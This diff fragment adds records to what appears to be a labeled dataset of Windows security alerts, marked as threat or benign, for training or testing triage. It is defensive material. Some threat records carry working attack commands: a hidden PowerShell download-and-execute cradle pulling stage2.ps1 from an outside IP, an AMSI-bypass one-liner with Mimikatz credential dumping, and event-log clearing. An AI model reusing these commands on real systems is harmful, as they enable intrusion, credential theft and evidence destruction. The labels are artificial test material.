+    "type": "persistence",
+    "label": "threat",
+    "severity": "high",
+    "description": "WMI event subscription persistence mechanism detected. Permanent WMI event consumer created that executes malicious script when any user logs on. Classic fileless persistence technique.",
+    "indicators": {
+      "src_ip": "10.12.9.201",
+      "wmi_namespace": "root\\subscription",
+      "event_filter": "__EventFilter: UserLogon",
+      "event_consumer": "CommandLineEventConsumer: SystemUpdate",
+      "consumer_command": "cmd.exe /c powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://91.215.85.17/stage2.ps1')",
+      "binding": "__FilterToConsumerBinding",
+      "process": "wmic.exe",
+      "hostname": "WS-IT-031",
+      "user": "CORP\\j.chen",
+      "event_id": 5861
+    }
+  },
+  {
+    "id": "FP-020",
+    "type": "persistence",
+    "label": "benign",
+    "severity": "medium",
+    "description": "New scheduled task created with SYSTEM privileges. Task configured to run daily at 2:00 AM executing script from Program Files. Created by IT admin account.",
+    "indicators": {
+      "src_ip": "10.12.2.15",
+      "task_name": "\\CorpNet\\DiskCleanup-Weekly",
+      "action": "C:\\Program Files\\CorpNet\\Scripts\\disk-cleanup.ps1",
+      "trigger": "Weekly, Sunday 02:00",
+      "run_level": "Highest",
+      "process": "schtasks.exe",
+      "parent_process": "powershell.exe",
+      "hostname": "SRV-FILE-01",
+      "user": "CORP\\admin.j.roberts",
+      "change_ticket": "CHG-2026-0411",
+      "explanation": "IT admin creating scheduled disk cleanup task per approved change request to address low disk space alerts"
+    }
+  },
+  {
+    "id": "FP-021",
+    "type": "persistence",
+    "label": "benign",
+    "severity": "low",
+    "description": "Registry Run key modification detected. New entry added to HKLM\\...\\Run by software installer. Executable set to launch at user logon.",
+    "indicators": {
+      "registry_key": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "value_name": "CrowdStrike Falcon Sensor",
+      "value_data": "C:\\Program Files\\CrowdStrike\\CSFalconService.exe /start",
+      "process": "msiexec.exe",
+      "parent_process": "services.exe",
+      "hostname": "WS-HR-012",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "installer": "CrowdStrike Falcon Sensor 7.14.msi",
+      "explanation": "CrowdStrike Falcon EDR agent MSI installer adding startup persistence — approved endpoint security software"
+    }
+  },
+  {
+    "id": "FP-022",
+    "type": "persistence",
+    "label": "benign",
+    "severity": "low",
+    "description": "New Windows service installed with automatic start. Service binary located in standard Program Files path. Installed by SCCM deployment.",
+    "indicators": {
+      "service_name": "SplunkForwarder",
+      "display_name": "Splunk Universal Forwarder",
+      "binary_path": "C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunkd.exe",
+      "start_type": "Automatic",
+      "account": "NT AUTHORITY\\LocalService",
+      "process": "msiexec.exe",
+      "parent_process": "ccmexec.exe",
+      "hostname": "WS-LEGAL-009",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "event_id": 7045,
+      "explanation": "SCCM deploying Splunk Universal Forwarder as part of approved enterprise log collection rollout"
+    }
+  },
+  {
+    "id": "TP-024",
+    "type": "defense_evasion",
+    "label": "threat",
+    "severity": "critical",
+    "description": "Windows Event Log tampering detected. Security event log cleared and audit policies disabled on domain controller. Attacker covering tracks after credential theft.",
+    "indicators": {
+      "src_ip": "10.12.1.10",
+      "logs_cleared": ["Security", "System", "PowerShell/Operational"],
+      "audit_policies_disabled": ["Logon/Logoff", "Object Access", "Privilege Use"],
+      "process": "wevtutil.exe",
+      "command_line": "wevtutil cl Security",
+      "parent_process": "cmd.exe",
+      "hostname": "DC-01",
+      "user": "CORP\\domain_admin",
+      "event_id": 1102,
+      "timestamp_anomaly": true
+    }
+  },
+  {
+    "id": "TP-025",
+    "type": "defense_evasion",
+    "label": "threat",
+    "severity": "critical",
+    "description": "AMSI bypass and EDR unhooking detected. Process patching amsi.dll and ntdll.dll in memory to disable security monitoring. Subsequent execution of Mimikatz in unmonitored state.",
+    "indicators": {
+      "src_ip": "10.12.9.201",
+      "process": "powershell.exe",
+      "parent_process": "cmd.exe",
+      "dlls_patched": ["amsi.dll", "ntdll.dll"],
+      "technique": "In-memory patching (ETW/AMSI bypass)",
+      "subsequent_tool": "Invoke-Mimikatz",
+      "commands": ["[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)", "Invoke-Mimikatz -DumpCreds"],
+      "hostname": "WS-IT-031",
+      "user": "CORP\\j.chen",
+      "edr_alerts_stopped": true
+    }
+  },
+  {
+    "id": "FP-023",
+    "type": "defense_evasion",
+    "label": "benign",
+    "severity": "medium",
+    "description": "Process modifying security tool configuration. Exclusions added to Windows Defender real-time protection for multiple directories and file extensions.",
+    "indicators": {
+      "src_ip": "10.12.30.5",
+      "process": "powershell.exe",
+      "command_line": "Set-MpPreference -ExclusionPath 'C:\\Jenkins\\workspace','C:\\BuildAgent\\temp' -ExclusionExtension '.obj','.pdb','.ilk'",
+      "exclusions_added": ["C:\\Jenkins\\workspace", "C:\\BuildAgent\\temp"],
+      "extension_exclusions": [".obj", ".pdb", ".ilk"],
+      "hostname": "SRV-JENKINS-01",
+      "user": "CORP\\admin.j.roberts",
+      "change_ticket": "CHG-2026-0355",
+      "explanation": "IT admin adding Defender exclusions for CI/CD build directories to reduce CPU overhead during compilation — approved change"
+    }
+  },
+  {
+    "id": "FP-024",
+    "type": "defense_evasion",
+    "label": "benign",
+    "severity": "low",
+    "description": "Firewall rule modification detected. Multiple inbound allow rules created on web server. Rules permit traffic on non-standard ports from external IPs.",
+    "indicators": {
+      "src_ip": "10.12.20.45",
+      "rules_created": [
+        {"name": "Allow-App-8443", "port": 8443, "protocol": "TCP", "direction": "Inbound"},
+        {"name": "Allow-App-8444", "port": 8444, "protocol": "TCP", "direction": "Inbound"}
+      ],
+      "process": "netsh.exe",
+      "hostname": "SRV-WEB-03",
+      "user": "CORP\\admin.s.wilson",
+      "change_ticket": "CHG-2026-0420",
+      "explanation": "IT admin opening ports for new API service deployment per approved change request and architecture review"
+    }
+  },
+  {
+    "id": "FP-025",
+    "type": "defense_evasion",
+    "label": "benign",
+    "severity": "low",
+    "description": "Sysmon configuration modified. New exclusion rules added filtering out specific process names and paths from event logging. Changes applied across multiple servers via GPO.",
+    "indicators": {
+      "src_ip": "10.12.2.15",
+      "config_file": "C:\\Windows\\Sysmon\\sysmonconfig.xml",
+      "exclusions_added": [
+        {"process": "MsMpEng.exe", "reason": "Defender noise reduction"},
+        {"process": "SearchIndexer.exe", "reason": "Index rebuild noise"},
+        {"process": "TiWorker.exe", "reason": "Windows Update noise"}
+      ],
+      "process": "sysmon64.exe",
+      "hostname": "DC-01",
+      "user": "CORP\\admin.j.roberts",
+      "change_ticket": "CHG-2026-0430",
+      "gpo_name": "Sysmon-Config-v3.2",
+      "explanation": "Security team tuning Sysmon configuration to reduce false positive event volume per SOC request — approved by CISO"
+    }
+  }
+]
